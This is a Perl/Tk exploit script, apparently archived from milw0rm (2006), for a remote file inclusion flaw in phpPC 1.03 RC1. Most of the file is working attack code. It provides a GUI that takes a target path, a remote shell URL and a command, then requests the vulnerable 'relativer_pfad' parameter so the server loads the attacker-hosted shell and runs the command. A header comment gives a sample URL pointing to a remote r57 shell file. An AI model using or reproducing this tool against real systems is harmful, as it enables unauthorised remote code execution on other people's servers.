#!/usr/bin/perl

#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   - - [xp10 TEAM THE BEST POLISH TEAM] - -
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- phpPC <= 1.03 RC1 Remote File Include Exploit
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: phppc
#- [Script site: http://www.phppc.de/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-          Find by: The-wolf-ksa (wolf)
#+
#-    wolf TEAM
#+
#-          Contact: the-wolf-ksa@hotmail.com.pl
#-                        or
#-           http://www.xp10.com.pl/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Special Greetz:  ;-)
#- Ema:
#-                 my friends
#-
#- Greetz for all users wolf TEAM IRC Channel !!
#!@ Przyjazni nie da sie zamienic na marne korzysci @!
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Z Dedykacja dla osoby,
#-         bez ktorej nie mogl bym zyc...
#-           K.C:* J.M (wolf)
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Example: http://[site]/phppc/lib/functions.inc.php?relativer_pfad=http://members.lycos.co.uk/visualmx/r57n.txt?
use Tk;
use Tk::DialogBox;
use LWP::UserAgent;

$mw = new MainWindow(title => "wolf TEAM :: phpPC 1.03  Remote File Include Exploit :: by the-wolf-ksa ;-)  " );
$mw->geometry ( '500x300' ) ;
$mw->resizable(0,0);

$mw->Label(-text => 'phpPC 1.03 RC1 Remote File Include Exploit by the-wolf-ksa', -font => '{Verdana} 7 bold',-foreground=>'blue')->pack();
$mw->Label(-text => '')->pack();

$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

$url = 'http://www.site.com/[path]/lib/functions.inc.php?relativer_pfad=';
$shell_path = 'http://shell.txt?';
$cmd = 'ls -la';


$fleft->Label ( -text => 'Script Path: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'Shell Path: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$shell_path) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'CMD: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$cmd) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fright->Label( -text => ' ')->pack();
$fleft->Label( -text => ' ')->pack();



$fright->Button(-text    => 'Exploit Include Vulnerability',
               -relief => "groove",
               -width => '30',
               -font => '{Verdana} 8 bold',
               -activeforeground => 'red',
               -command => \&akcja
              )->pack();


$fright->Label( -text => ' ')->pack();
$fright->Label( -text => 'Exploit coded by the-wolf-ksa', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'wolf TEAM :: The Best Polish Team', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'the-wolf-ksa@hotmail.com.pl/', -font => '{Verdana} 7')->pack();

MainLoop();

sub akcja()
{
$InfoWindow=$mw->DialogBox(-title   => 'wolf TEAM :: Exploit by the-wolf-ksa ;-) ', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => ' for help the-wolf-ksa@hotmail.com.pl #wolfteam', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'wolf TEAM SITE: http://www.xp10.com.pl/', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'Greetz For my friends ;-)', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;

system("start $url$shell_path$cmd");
$InfoWindow->Show();
}
# xp10.com ]

# milw0rm.com [2006-10-08]
